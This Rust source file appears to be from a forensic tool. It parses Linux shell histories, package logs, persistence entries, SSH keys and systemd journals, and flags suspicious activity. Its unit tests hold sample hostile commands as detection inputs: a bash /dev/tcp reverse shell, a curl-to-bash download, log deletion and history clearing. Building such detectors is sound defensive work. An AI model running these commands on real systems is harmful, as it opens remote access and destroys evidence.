        a.commands.push(ShellCommand { user: user.clone(), shell: shell.into(), command: cmd.chars().take(4000).collect(), time: t, line: line as u32 + 1, file, deleted: f.e.deleted, flag: notable_command(cmd).unwrap_or("").into() });
    };
    match shell {
        "zsh" => {
            for (n, l) in s.lines().enumerate() {
                // ": 1700000000:0;command"
                if let Some(rest) = l.strip_prefix(": ") {
                    if let Some((meta, cmd)) = rest.split_once(';') {
                        let ts = meta.split(':').next().unwrap_or("").trim().parse().unwrap_or(0);
                        push(a, cmd, ft(ts), n);
                        continue;
                    }
                }
                push(a, l, 0, n);
            }
        }
        "fish" => {
            let mut cmd = String::new();
            for (n, l) in s.lines().enumerate() {
                if let Some(c) = l.strip_prefix("- cmd: ") {
                    cmd = c.to_string();
                } else if let Some(w) = l.trim().strip_prefix("when: ") {
                    push(a, &cmd, ft(w.parse().unwrap_or(0)), n);
                    cmd.clear();
                }
            }
        }
        "python" | "mysql" | "psql" | "sqlite" => {
            for (n, l) in s.lines().enumerate() {
                if !l.starts_with("_HiStOrY_V2_") {
                    push(a, &l.replace("\\040", " "), 0, n);
                }
            }
        }
        _ => {
            for (n, l) in s.lines().enumerate() {
                // bash with HISTTIMEFORMAT: "#1700000000" before each command
                if let Some(ts) = l.strip_prefix('#').filter(|x| x.len() >= 9 && x.len() <= 11 && x.chars().all(|c| c.is_ascii_digit())) {
                    t = ft(ts.parse().unwrap_or(0));
                    continue;
                }
                push(a, l, t, n);
                t = 0;
            }
        }
    }
}

fn apt_history(a: &mut LinuxArtifacts, s: &str, zone: &Zone, times: &mut HashMap<String, (u64, String)>, file: u32) {
    for block in s.split("\n\n") {
        let g = |k: &str| block.lines().find_map(|l| l.strip_prefix(k)).unwrap_or("").trim().to_string();
        let start = g("Start-Date:");
        let mut parts = start.split_whitespace();
        let Some(t) = (|| local_ymd_hms(parts.next()?, parts.next()?, zone))() else { continue };
        let by = g("Requested-By:").split(' ').next().unwrap_or("").to_string();
        let cmd = g("Commandline:");
        for (verb, key) in [("install", "Install:"), ("upgrade", "Upgrade:"), ("remove", "Remove:"), ("purge", "Purge:")] {
            let list = g(key);
            if list.is_empty() {
                continue;
            }
            // "nmap:amd64 (7.94, automatic), libfoo:amd64 (1.0)"
            for item in split_packages(&list) {
                let name = item.split(':').next().unwrap_or("").trim().to_string();
                if verb == "install" {
                    let e = times.entry(name.clone()).or_insert((t, by.clone()));
                    if e.1.is_empty() {
                        e.1 = by.clone();
                    }
                }
            }
            if a.events.len() < MAX_EVENTS {
                a.events.push(LinuxEvent {
                    time: t,
                    category: "Package".into(),
                    summary: format!("{}{}: {}", if cmd.is_empty() { verb.to_string() } else { cmd.clone() }, if by.is_empty() { String::new() } else { format!(" (by {})", by) }, list.chars().take(300).collect::<String>()),
                    program: "apt".into(),
                    user: by.clone(),
                    message: list.chars().take(2000).collect(),
                    source: "apt history".into(),
                    file,
                    ..Default::default()
                });
            }
        }
        if !cmd.is_empty() {
            a.commands.push(ShellCommand { user: if by.is_empty() { "root".into() } else { by.clone() }, shell: "apt".into(), command: cmd.clone(), time: t, file, flag: notable_command(&cmd).unwrap_or("").into(), ..Default::default() });
        }
    }
}

fn split_packages(list: &str) -> Vec<String> {
    let mut out = vec![];
    let mut depth = 0;
    let mut cur = String::new();
    for c in list.chars() {
        match c {
            '(' => depth += 1,
            ')' => depth -= 1,
            ',' if depth == 0 => {
                out.push(cur.trim().to_string());
                cur.clear();
                continue;
            }
            _ => {}
        }
        if depth == 0 && c != ')' {
            cur.push(c);
        }
    }
    if !cur.trim().is_empty() {
        out.push(cur.trim().to_string());
    }
    out
}

fn persistence(a: &mut LinuxArtifacts, kind: Kind, s: &str, f: &FileRow, file: u32) {
    let written = f.e.si.map(|t| t.modified).unwrap_or(0);
    let push = |a: &mut LinuxArtifacts, k: &str, name: String, command: String, user: String, reason: Option<&str>| {
        a.persistence.push(Persistence { kind: k.into(), location: f.e.path.clone(), name, command: command.chars().take(2000).collect(), user, written, unusual: reason.is_some(), reason: reason.unwrap_or("").into(), file, deleted: f.e.deleted });
    };
    let lines = || s.lines().map(str::trim).filter(|l| !l.is_empty() && !l.starts_with('#'));
    match kind {
        Kind::Cron => {
            let spool = f.e.path.starts_with("/var/spool/cron");
            let system = !spool;
            for l in lines() {
                if l.contains('=') && !l.starts_with('@') && l.split_whitespace().next().is_some_and(|w| w.contains('=')) {
                    continue; // SHELL=, PATH=, MAILTO=
                }
                let p: Vec<&str> = l.split_whitespace().collect();
                let sched = if l.starts_with('@') { 1 } else { 5 };
                if f.e.path == "/etc/anacrontab" {
                    if p.len() >= 4 {
                        push(a, "cron", format!("anacron every {} day(s)", p[0]), p[3..].join(" "), "root".into(), unusual_command(&p[3..].join(" ")));
                    }
                    continue;
                }
                let need = sched + if system { 2 } else { 1 };
                if p.len() < need {
                    continue;
                }
                let user = if system { p[sched].to_string() } else { f.e.name.clone() };
                let cmd = p[sched + system as usize..].join(" ");
                push(a, "cron", p[..sched].join(" "), cmd.clone(), user, unusual_command(&cmd));
            }
        }
        Kind::CronDir => {
            let dir = f.e.path.rsplit('/').nth(1).unwrap_or("").to_string();
            push(a, &dir, f.e.name.clone(), lines().filter(|l| !l.starts_with("set ")).take(3).collect::<Vec<_>>().join("; "), "root".into(), unusual_command(s));
        }
        Kind::Systemd => {
            let kv: Vec<(&str, &str)> = lines().filter_map(|l| l.split_once('=')).map(|(k, v)| (k.trim(), v.trim())).collect();
            let exec: Vec<&str> = kv.iter().filter(|(k, _)| k.starts_with("Exec") && *k != "ExecStop").map(|(_, v)| *v).collect();
            let desc = kv.iter().find(|(k, _)| *k == "Description").map(|x| x.1).unwrap_or("");
            let user = kv.iter().find(|(k, _)| *k == "User").map(|x| x.1.to_string()).unwrap_or_else(|| if f.e.path.contains("/.config/systemd/user") { home_user(&f.e.path) } else { "root".into() });
            let cmd = if exec.is_empty() { kv.iter().find(|(k, _)| matches!(*k, "OnCalendar" | "OnBootSec" | "ListenStream" | "PathChanged" | "Unit")).map(|(k, v)| format!("{}={}", k, v)).unwrap_or_default() } else { exec.join("; ") };
            let name = if desc.is_empty() { f.e.name.clone() } else { format!("{} ({})", f.e.name, desc) };
            push(a, "systemd", name, cmd.clone(), user, unusual_command(&cmd));
        }
        Kind::RcLocal => {
            for l in lines().filter(|l| *l != "exit 0") {
                push(a, "rc.local", "rc.local".into(), l.to_string(), "root".into(), unusual_command(l));
            }
        }
        Kind::Preload => {
            for l in lines() {
                push(a, "ld.so.preload", "ld.so.preload".into(), l.to_string(), "root".into(), Some("a library loaded into every program: a common rootkit technique"));
            }
        }
        Kind::Sudoers => {
            for l in lines().filter(|l| !l.starts_with("Defaults") && !l.starts_with("@include") && !l.starts_with("#include")) {
                let reason = if l.contains("NOPASSWD") { Some("sudo without a password") } else { None };
                push(a, "sudoers", l.split_whitespace().next().unwrap_or("").to_string(), l.to_string(), String::new(), reason);
            }
        }
        Kind::AuthorizedKeys => {
            let user = home_user(&f.e.path);
            for l in lines() {
                // [options] type base64 comment
                let p: Vec<&str> = l.split_whitespace().collect();
                let Some(ti) = p.iter().position(|w| w.starts_with("ssh-") || w.starts_with("ecdsa-") || w.starts_with("sk-")) else { continue };
                let options = p[..ti].join(" ");
                let key = p.get(ti + 1).copied().unwrap_or("");
                let fp = base64(key).map(|raw| format!("SHA256:{}", base64_encode_nopad(&kokino_core::hashing::sha256_bytes(&raw)))).unwrap_or_default();
                let comment = p.get(ti + 2..).map(|x| x.join(" ")).unwrap_or_default();
                let reason = if options.contains("command=") { Some("forced command on the key") } else { None };
                push(a, "SSH key", if comment.is_empty() { p[ti].to_string() } else { comment }, format!("{} {}{}", p[ti], fp, if options.is_empty() { String::new() } else { format!(" ({})", options) }), user.clone(), reason);
            }
        }
        Kind::ShellRc => {
            let user = home_user(&f.e.path);
            for l in lines() {
                if let Some(r) = unusual_command(l).or_else(|| notable_command(l)) {
                    push(a, "shell startup", f.e.name.clone(), l.to_string(), user.clone(), Some(r));
                }
            }
        }
        _ => {}
    }
}

fn dhcp(a: &mut LinuxArtifacts, s: &str, name: &str) {
    for block in s.split("lease {").skip(1) {
        let g = |k: &str| block.lines().map(str::trim).find_map(|l| l.strip_prefix(k)).map(|v| v.trim_end_matches(';').trim().trim_matches('"').to_string()).unwrap_or_default();
        let ip = g("fixed-address ");
        if ip.is_empty() {
            continue;
        }
        let iface = g("interface ");
        let ni = NetInterface { guid: if iface.is_empty() { name.to_string() } else { iface }, ip, dhcp_server: g("option dhcp-server-identifier "), domain: g("option domain-name "), gateway: g("option routers ") };
        if !a.interfaces.iter().any(|x| x.ip == ni.ip && x.guid == ni.guid) {
            a.interfaces.push(ni);
        }
    }
}

fn base64(s: &str) -> Option<Vec<u8>> {
    let val = |c: u8| -> Option<u32> {
        Some(match c {
            b'A'..=b'Z' => c - b'A',
            b'a'..=b'z' => c - b'a' + 26,
            b'0'..=b'9' => c - b'0' + 52,
            b'+' => 62,
            b'/' => 63,
            _ => return None,
        } as u32)
    };
    let b: Vec<u8> = s.bytes().filter(|&c| c != b'=').collect();
    if b.is_empty() || b.len() > 1 << 16 {
        return None;
    }
    let mut out = Vec::with_capacity(b.len() * 3 / 4);
    for ch in b.chunks(4) {
        let mut n = 0u32;
        for (i, &c) in ch.iter().enumerate() {
            n |= val(c)? << (18 - 6 * i);
        }
        out.push((n >> 16) as u8);
        if ch.len() > 2 {
            out.push((n >> 8) as u8);
        }
        if ch.len() > 3 {
            out.push(n as u8);
        }
    }
    Some(out)
}

fn base64_encode_nopad(d: &[u8]) -> String {
    const A: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::new();
    for ch in d.chunks(3) {
        let n = (ch[0] as u32) << 16 | (*ch.get(1).unwrap_or(&0) as u32) << 8 | *ch.get(2).unwrap_or(&0) as u32;
        for i in 0..=ch.len() {
            out.push(A[(n >> (18 - 6 * i) & 63) as usize] as char);
        }
    }
    out
}

/// Runs every Linux text and binary parser over one input (for the fuzzer).
#[doc(hidden)]
pub fn fuzz_parsers(d: &[u8]) {
    let mut a = LinuxArtifacts::default();
    let _ = journal(d);
    let zone = Zone::parse(d, "").unwrap_or_else(Zone::utc);
    let _ = zone.to_utc(1_792_483_530);
    utmp(&mut a, d, false, 0);
    let s = text(d);
    let mut usb = vec![];
    for l in syslog_lines(&s, ft(1_792_483_530), &zone) {
        kernel_usb(&mut usb, l.msg, 1);
        if let Some(ev) = event_from(l.prog, l.pid, l.msg, l.host, 1, l.guessed, "fuzz", 0) {
            push_event(&mut a, ev);
        }
    }
    finish_usb(&mut a, usb);
    let _ = parse_rule(s.lines().next().unwrap_or(""));
    apt_history(&mut a, &s, &zone, &mut HashMap::new(), 0);
    dhcp(&mut a, &s, "x");
    let _ = ini(&s);
    for para in s.split("\n\n").take(1000) {
        let _ = deb_fields(para);
    }
    for l in s.lines().take(10_000) {
        let _ = notable_command(l);
        let _ = unusual_command(l);
        let _ = base64(l);
    }
}

/// Plain-language lines for the volume's impact summary.
pub fn impact(a: &LinuxArtifacts) -> Vec<String> {
    let mut out = vec![];
    let c = &a.computer;
    let iso = |t: u64| if t == 0 { "unknown".to_string() } else { kokino_core::time::filetime_to_iso(t) };
    if !c.hostname.is_empty() || !c.os.is_empty() {
        let mac = c.os_id == "macos";
        let created = if c.fs_created == 0 { String::new() } else { format!("; {} {}", if mac { "set up" } else { "file system created" }, iso(c.fs_created)) };
        out.push(format!("{} {} running {}{}.", if mac { "Mac" } else { "Linux computer" }, if c.hostname.is_empty() { "(no hostname)" } else { &c.hostname }, if c.os.is_empty() { if mac { "an unknown macOS version" } else { "an unknown distribution" } } else { &c.os }, created));
    }
    let can_login: Vec<&str> = a.users.iter().filter(|u| u.login_shell && !u.password.starts_with("locked")).map(|u| u.name.as_str()).collect();
    if !can_login.is_empty() {
        out.push(format!("Accounts that can log in: {}.", can_login.join(", ")));
    }
    for u in a.users.iter().filter(|u| !u.note.is_empty()) {
        out.push(format!("Account {}: {}.", u.name, u.note));
    }
    let ok = a.logons.iter().filter(|l| l.kind == "logon").count();
    let failed = a.logons.iter().filter(|l| l.kind == "failed").count();
    if ok + failed > 0 {
        let mut ips: Vec<&str> = a.logons.iter().filter(|l| l.kind == "logon" && l.how == "ssh").map(|l| l.from.as_str()).filter(|s| !s.is_empty()).collect();
        ips.sort();
        ips.dedup();
        out.push(format!("{} logon(s) and {} failed logon(s) recorded{}.", ok, failed, if ips.is_empty() { String::new() } else { format!("; SSH from {}", ips.iter().take(10).cloned().collect::<Vec<_>>().join(", ")) }));
    }
    let mut flagged: Vec<String> = a.commands.iter().filter(|c| !c.flag.is_empty()).map(|c| format!("{} ({}, {})", c.flag, c.user, c.shell)).collect();
    flagged.sort();
    flagged.dedup();
    if !flagged.is_empty() {
        out.push(format!("Notable commands typed: {}.", flagged.into_iter().take(12).collect::<Vec<_>>().join("; ")));
    }
    let odd = a.persistence.iter().filter(|p| p.unusual).count();
    if odd > 0 {
        let kinds: std::collections::BTreeSet<&str> = a.persistence.iter().filter(|p| p.unusual).map(|p| p.kind.as_str()).collect();
        out.push(format!("{} persistence entr{} stand out ({}).", odd, if odd == 1 { "y" } else { "ies" }, kinds.into_iter().collect::<Vec<_>>().join(", ")));
    }
    if !a.usb.is_empty() {
        out.push(format!("{} USB device(s) seen by the kernel: {}.", a.usb.len(), a.usb.iter().map(|u| u.name.clone()).collect::<Vec<_>>().join(", ")));
    }
    if a.logs.iter().any(|l| l.note.contains("year inferred")) {
        out.push(format!("Classic syslog lines carry no year or time zone: years were inferred from each file's modification time and times converted from {}.", if c.time_zone.is_empty() { "UTC" } else { &c.time_zone }));
    }
    out.extend(crate::macos::impact(a));
    out
}

// ------------------------------------------------------------------ journald

pub struct Journal {
    /// (realtime FILETIME, fields)
    pub entries: Vec<(u64, Vec<(String, String)>)>,
    /// Compressed fields that could not be decoded.
    pub compressed: u64,
    pub dirty: bool,
}

const JOURNAL_FIELDS: &[&str] = &["MESSAGE", "SYSLOG_IDENTIFIER", "_COMM", "_PID", "_HOSTNAME", "_UID", "_EXE", "_CMDLINE"];

/// Reads a systemd journal file: every entry object with the fields Kokino
/// uses. Compressed data objects (XZ, LZ4 or zstd, as journald writes long
/// fields) are decoded; one that cannot be is counted.
pub fn journal(d: &[u8]) -> anyhow::Result<Journal> {
    if d.len() < 240 || &d[..8] != b"LPKSHHRH" {
        anyhow::bail!("not a systemd journal file");
    }
    let incompat = u32le(d, 12);
    let compact = incompat & 16 != 0;
    let state = d[16];
    let header = u64le(d, 88) as usize;
    let arena = u64le(d, 96) as usize;
    let end = header.saturating_add(arena).min(d.len());
    let mut j = Journal { entries: vec![], compressed: 0, dirty: state == 1 };
    let mut fields_cache: HashMap<usize, Option<(String, String)>> = HashMap::new();
    let mut off = header.max(240);
    while off.checked_add(16).is_some_and(|e| e <= end) && j.entries.len() < MAX_EVENTS * 4 {
        let ty = d[off];
        let size = u64le(d, off + 8) as usize;
        if size < 16 || off.checked_add(size).is_none_or(|e| e > end) {
            break;
        }
        if ty == 3 && size >= 64 {
            let rt = u64le(d, off + 24) as i64;
            let item = if compact { 4 } else { 16 };
            let n = (size - 64) / item;
            let mut fields = vec![];
            for k in 0..n.min(512) {
                let p = off + 64 + k * item;
                let data = if compact { u32le(d, p) as usize } else { u64le(d, p) as usize };
                let f = fields_cache.entry(data).or_insert_with(|| data_field(d, data, compact, end, &mut j.compressed)).clone();
                if let Some(f) = f {
                    fields.push(f);
                }
            }
            if fields_cache.len() > 1 << 20 {
                fields_cache.clear();
            }
            j.entries.push((ft_us(rt), fields));
        }
        off += (size + 7) & !7;
    }
    j.entries.sort_by_key(|e| e.0);
    Ok(j)
}

fn data_field(d: &[u8], off: usize, compact: bool, end: usize, compressed: &mut u64) -> Option<(String, String)> {
    if off.checked_add(64).is_none_or(|e| e > end) || d[off] != 1 {
        return None;
    }
    let size = u64le(d, off + 8) as usize;
    let start = off + if compact { 72 } else { 64 };
    if size < start - off || off.checked_add(size).is_none_or(|e| e > end) {
        return None;
    }
    let raw = &d[start..off + size];
    let flags = d[off + 1] & 7;
    let decoded;
    let payload: &[u8] = if flags == 0 {
        raw
    } else {
        match decompress(flags, raw, 64 + 4000) {
            Some(v) => {
                decoded = v;
                &decoded
            }
            None => {
                *compressed += 1;
                return None;
            }
        }
    };
    let eq = payload.iter().take(64).position(|&c| c == b'=')?;
    let name = std::str::from_utf8(&payload[..eq]).ok()?;
    if !JOURNAL_FIELDS.contains(&name) {
        return None;
    }
    Some((name.to_string(), String::from_utf8_lossy(&payload[eq + 1..payload.len().min(eq + 1 + 4000)]).into_owned()))
}

/// A journald data object's payload: flag 1 XZ, 2 LZ4 (journald's form:
/// the uncompressed size as 8 bytes, then one LZ4 block), 4 zstd. At most
/// `max` bytes are produced; `None` when it cannot be decoded.
pub fn decompress(flags: u8, raw: &[u8], max: usize) -> Option<Vec<u8>> {
    use std::io::Read;
    match flags {
        1 => {
            struct Capped(Vec<u8>, usize);
            impl std::io::Write for Capped {
                fn write(&mut self, b: &[u8]) -> std::io::Result<usize> {
                    let room = self.1.saturating_sub(self.0.len());
                    self.0.extend_from_slice(&b[..b.len().min(room)]);
                    if room < b.len() {
                        return Err(std::io::Error::other("enough"));
                    }
                    Ok(b.len())
                }
                fn flush(&mut self) -> std::io::Result<()> {
                    Ok(())
                }
            }
            let mut out = Capped(vec![], max);
            let res = lzma_rs::xz_decompress(&mut std::io::BufReader::new(raw), &mut out);
            // Stopping early at the cap is fine; a damaged stream with nothing out is not.
            (res.is_ok() || out.0.len() >= max).then_some(out.0)
        }
        2 => {
            let size = u64::from_le_bytes(raw.get(..8)?.try_into().ok()?) as usize;
            lz4_block(raw.get(8..)?, size.min(max))
        }
        4 => {
            let mut src = raw;
            let mut dec = ruzstd::streaming_decoder::StreamingDecoder::new(&mut src).ok()?;
            let mut out = vec![];
            (&mut dec).take(max as u64).read_to_end(&mut out).ok()?;
            Some(out)
        }
        _ => None,
    }
}

/// One LZ4 block, up to `max` bytes of output.
pub fn lz4_block(src: &[u8], max: usize) -> Option<Vec<u8>> {
    let mut out: Vec<u8> = Vec::with_capacity(max.min(1 << 20));
    let mut p = 0usize;
    let len = |p: &mut usize, mut n: usize| -> Option<usize> {
        if n == 15 {
            loop {
                let b = *src.get(*p)?;
                *p += 1;
                n = n.checked_add(b as usize)?;
                if b != 255 {
                    break;
                }
            }
        }
        Some(n)
    };
    while p < src.len() && out.len() < max {
        let token = src[p];
        p += 1;
        let lit = len(&mut p, (token >> 4) as usize)?;
        let lits = src.get(p..p.checked_add(lit)?)?;
        out.extend_from_slice(&lits[..lits.len().min(max - out.len())]);
        p += lit;
        if p >= src.len() || out.len() >= max {
            break; // the last sequence has literals only
        }
        let off = u16::from_le_bytes([*src.get(p)?, *src.get(p + 1)?]) as usize;
        p += 2;
        if off == 0 || off > out.len() {
            return None;
        }
        let mlen = len(&mut p, (token & 15) as usize)?.checked_add(4)?;
        let start = out.len() - off;
        for k in 0..mlen.min(max - out.len()) {
            let b = out[start + k];
            out.push(b);
        }
    }
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The three compressions journald uses for long fields.
    #[test]
    fn journal_compression() {
        // LZ4 as journald stores it: the size, then one block. "MESSAGE=abc"
        // as literals, then a match of 27 bytes at offset 3 (abc repeated).
        let want = [b"MESSAGE=".to_vec(), b"abc".repeat(10)].concat();
        let mut lz4 = (want.len() as u64).to_le_bytes().to_vec();
        lz4.push(0xBF); // 11 literals; match length 15 + extra
        lz4.extend_from_slice(b"MESSAGE=abc");
        lz4.extend_from_slice(&3u16.to_le_bytes());
        lz4.push(8); // 4 + 15 + 8 = 27
        assert_eq!(decompress(2, &lz4, 4096).unwrap(), want);
        assert_eq!(decompress(2, &lz4, 20).unwrap(), &want[..20]);
        // A match reaching before the start is refused.
        assert!(lz4_block(&[0x14, b'a', 9, 0], 100).is_none());
        // XZ (LZMA2, compressed chunk) made by Python's lzma module.
        let xz: &[u8] = &[
            0xfd, 0x37, 0x7a, 0x58, 0x5a, 0x00, 0x00, 0x04, 0xe6, 0xd6, 0xb4, 0x46, 0x02, 0x00, 0x21, 0x01,
            0x16, 0x00, 0x00, 0x00, 0x74, 0x2f, 0xe5, 0xa3, 0xe0, 0x01, 0x4b, 0x00, 0x3f, 0x5d, 0x00, 0x26,
            0x91, 0x46, 0xc0, 0xd1, 0x94, 0x57, 0xe4, 0x94, 0xc7, 0xf1, 0xa1, 0xe0, 0xaf, 0x68, 0x9d, 0xc1,
            0x00, 0x7e, 0x40, 0x2a, 0xdb, 0x53, 0x70, 0x5c, 0x01, 0x7b, 0x74, 0x11, 0x6f, 0x74, 0x54, 0xdf,
            0xf1, 0xd9, 0xf8, 0x58, 0xf4, 0x61, 0xf0, 0x40, 0x24, 0xbf, 0xd0, 0x54, 0xf0, 0x71, 0x04, 0xba,
            0xa9, 0x06, 0x36, 0x3a, 0x45, 0x50, 0x6b, 0x0a, 0x3c, 0xcc, 0x7c, 0xe5, 0xe0, 0x00, 0x00, 0x00,
            0xf1, 0x7f, 0xab, 0x2b, 0x20, 0x8d, 0xa2, 0x66, 0x00, 0x01, 0x5b, 0xcc, 0x02, 0x00, 0x00, 0x00,
            0xb8, 0xe1, 0xf0, 0x23, 0xb1, 0xc4, 0x67, 0xfb, 0x02, 0x00, 0x00, 0x00, 0x00, 0x04, 0x59, 0x5a,
        ];
        let text = [b"MESSAGE=".to_vec(), b"pam_unix(sshd:session): session opened for user alice ".repeat(6)].concat();
        assert_eq!(decompress(1, xz, 1 << 16).unwrap(), text);
        assert_eq!(decompress(1, xz, 30).unwrap(), &text[..30]);
        // zstd: a frame written by the zstd tool (the ruzstd test fixture
        // abc.txt.zst, with its content checksum).
        let zst: &[u8] = &[0x28, 0xb5, 0x2f, 0xfd, 0x04, 0x58, 0xd1, 0x00, 0x00, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x5c, 0x83, 0x89, 0xfa];
        assert_eq!(decompress(4, zst, 4096).as_deref(), Some(&b"abcdefghijklmnopqrstuvwxyz"[..]));
        assert!(decompress(4, b"not zstd", 4096).is_none());
        assert!(decompress(1, b"not xz", 4096).is_none());
        assert!(decompress(3, &lz4, 4096).is_none());
    }

    #[test]
    fn rules_and_zones() {
        let r = parse_rule("CET-1CEST,M3.5.0,M10.5.0/3").unwrap();
        // 2026-07-01 12:00 UTC is summer time (+2), 2026-12-01 is +1.
        assert_eq!(r.offset_at(1_782_907_200), 7200);
        assert_eq!(r.offset_at(1_796_126_400), 3600);
        // DST ends 2026-10-25 01:00 UTC.
        assert_eq!(r.offset_at(1_792_890_000 - 1), 7200);
        assert_eq!(r.offset_at(1_792_890_000), 3600);
        let us = parse_rule("EST5EDT,M3.2.0,M11.1.0").unwrap();
        assert_eq!(us.offset_at(1_782_907_200), -4 * 3600);
        assert_eq!(parse_rule("<+03>-3").unwrap().offset_at(0), 3 * 3600);
        let z = Zone { name: "Europe/Skopje".into(), rule: Some(r), ..Default::default() };
        // 2026-10-20 10:05:30 local (+2) is 08:05:30 UTC.
        let local = chrono::NaiveDate::from_ymd_opt(2026, 10, 20).unwrap().and_hms_opt(10, 5, 30).unwrap().and_utc().timestamp();
        assert_eq!(z.to_utc(local), 1_792_483_530);
    }

    #[test]
    fn syslog_years_and_messages() {
        let log = "Dec 31 23:59:01 lab-srv sshd[100]: Accepted publickey for alice from 192.0.2.10 port 50000 ssh2: ED25519 SHA256:x\n\
                   Jan  1 00:00:05 lab-srv sshd[101]: Failed password for invalid user admin from 198.51.100.7 port 4242 ssh2\n\
                   Jan  1 00:01:00 lab-srv sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/shred -u /var/log/auth.log\n";
        let mtime = ft(1_798_761_600 + 3600); // 2027-01-01 01:00 UTC
        let lines = syslog_lines(log, mtime, &Zone::utc());
        assert_eq!(lines.len(), 3);
        assert_eq!(lines[0].utc, 1_798_761_541); // 2026-12-31 23:59:01
        assert_eq!(lines[1].utc, 1_798_761_605); // 2027-01-01 00:00:05
        let (cat, sum, user, ip, kind, how) = classify(lines[0].prog, lines[0].msg).unwrap();
        assert_eq!((cat, user.as_str(), ip.as_str(), kind, how), ("Logon", "alice", "192.0.2.10", "logon", "ssh"));
        assert!(sum.contains("publickey"));
        let (cat, _, user, ip, kind, _) = classify(lines[1].prog, lines[1].msg).unwrap();
        assert_eq!((cat, user.as_str(), ip.as_str(), kind), ("Failed logon", "admin", "198.51.100.7", "failed"));
        let (cat, sum, user, ..) = classify(lines[2].prog, lines[2].msg).unwrap();
        assert_eq!((cat, user.as_str()), ("Sudo", "alice"));
        assert!(sum.contains("/usr/bin/shred"));
        let rfc = syslog_lines("2026-10-20T10:05:30.250000+02:00 lab-srv sshd[5]: Accepted password for bob from 203.0.113.9 port 1 ssh2\n", 0, &Zone::utc());
        assert_eq!(rfc[0].utc, 1_792_483_530);
        assert_eq!(rfc[0].prog, "sshd");
    }

    #[test]
    fn commands() {
        assert_eq!(notable_command("shred -u secrets.txt"), Some("secure deletion"));
        assert_eq!(notable_command("history -c"), Some("history disabled or cleared"));
        assert_eq!(notable_command("rm -rf /var/log/*"), Some("logs or history removed"));
        assert_eq!(notable_command("touch -d '2020-01-01' x"), Some("timestamps set by hand"));
        assert_eq!(notable_command("bash -i >& /dev/tcp/192.0.2.1/4444 0>&1"), Some("reverse shell"));
        assert_eq!(notable_command("curl -s http://lab.test/x.sh | bash"), Some("downloaded script run"));
        assert_eq!(notable_command("ls -la"), None);
        assert_eq!(unusual_command("/tmp/.x/payload"), Some("runs from a temporary directory"));
        assert_eq!(unusual_command("/usr/bin/backup --daily"), None);
        assert_eq!(base64_encode_nopad(&base64("aGVsbG8=").unwrap()), "aGVsbG8");
        assert_eq!(split_packages("nmap:amd64 (7.94, automatic), libx:amd64 (1.0)"), vec!["nmap:amd64", "libx:amd64"]);
    }

    #[test]
    fn utmp_records() {
        let mut d = vec![0u8; 384 * 3];
        let rec = |d: &mut [u8], i: usize, ty: u32, line: &str, user: &str, host: &str, t: u32| {
            let r = &mut d[i * 384..(i + 1) * 384];
            r[0..4].copy_from_slice(&ty.to_le_bytes());
            r[8..8 + line.len()].copy_from_slice(line.as_bytes());
            r[44..44 + user.len()].copy_from_slice(user.as_bytes());
            r[76..76 + host.len()].copy_from_slice(host.as_bytes());
            r[340..344].copy_from_slice(&t.to_le_bytes());
        };
        rec(&mut d, 0, 2, "~", "reboot", "6.1.0-lab", 1_792_480_000);
        rec(&mut d, 1, 7, "pts/0", "alice", "192.0.2.10", 1_792_483_530);
        rec(&mut d, 2, 8, "pts/0", "", "", 1_792_487_130);
        let mut a = LinuxArtifacts::default();
        assert_eq!(utmp(&mut a, &d, false, 0), 3);
        assert_eq!(a.logons.len(), 2);
        assert_eq!(a.logons[1].user, "alice");
        assert_eq!(a.logons[1].from, "192.0.2.10");
        assert_eq!(a.logons[1].end, ft(1_792_487_130));
    }

    #[test]
    fn journal_entries() {
        // A minimal regular-mode journal: header, two data objects, one entry.
        let mut d = vec![0u8; 256];
        d[..8].copy_from_slice(b"LPKSHHRH");
        d[88..96].copy_from_slice(&256u64.to_le_bytes());
        let data = |name_val: &str| {
            let mut o = vec![0u8; 64];
            o[0] = 1;
            o.extend_from_slice(name_val.as_bytes());
            let size = o.len() as u64;
            o[8..16].copy_from_slice(&size.to_le_bytes());
            while o.len() % 8 != 0 {
                o.push(0);
            }
            o
        };
        let a = data("MESSAGE=Accepted password for bob from 203.0.113.9 port 22 ssh2");
        let b = data("SYSLOG_IDENTIFIER=sshd");
        let a_off = 256u64;
        let b_off = a_off + a.len() as u64;
        let e_off = b_off + b.len() as u64;
        let mut e = vec![0u8; 64];
        e[0] = 3;
        e[24..32].copy_from_slice(&1_792_483_530_000_000u64.to_le_bytes());
        for off in [a_off, b_off] {
            e.extend_from_slice(&off.to_le_bytes());
            e.extend_from_slice(&0u64.to_le_bytes());
        }
        let esize = e.len() as u64;
        e[8..16].copy_from_slice(&esize.to_le_bytes());
        d.extend(a);
        d.extend(b);
        d.extend(e);
        let arena = (d.len() - 256) as u64;
        d[96..104].copy_from_slice(&arena.to_le_bytes());
        let _ = e_off;
        let j = journal(&d).unwrap();
        assert_eq!(j.entries.len(), 1);
        assert_eq!(j.entries[0].0, ft(1_792_483_530));
        assert!(j.entries[0].1.iter().any(|(k, v)| k == "SYSLOG_IDENTIFIER" && v == "sshd"));
    }
}
